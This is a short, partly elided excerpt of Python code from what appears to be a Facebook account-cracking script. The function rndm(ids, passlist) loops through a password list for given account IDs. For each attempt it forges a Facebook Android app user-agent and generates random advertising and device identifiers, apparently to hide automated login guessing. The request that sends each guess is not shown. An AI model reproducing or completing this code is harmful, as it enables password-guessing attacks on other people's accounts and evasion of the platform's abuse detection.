...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua  = 'Dalvik/2.0.0 (Linux; U; Android 8.0; HTC U12+ Build/OPR1.170623.032) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=3.5,width=1440,height=2880};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/HTC;FBMF/U12+;FBBD/U12+;FBPN/com.facebook.katana;FBDV/U12+;FBSV/8.0;FBOP/1;FBCA/arm64-v8a;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
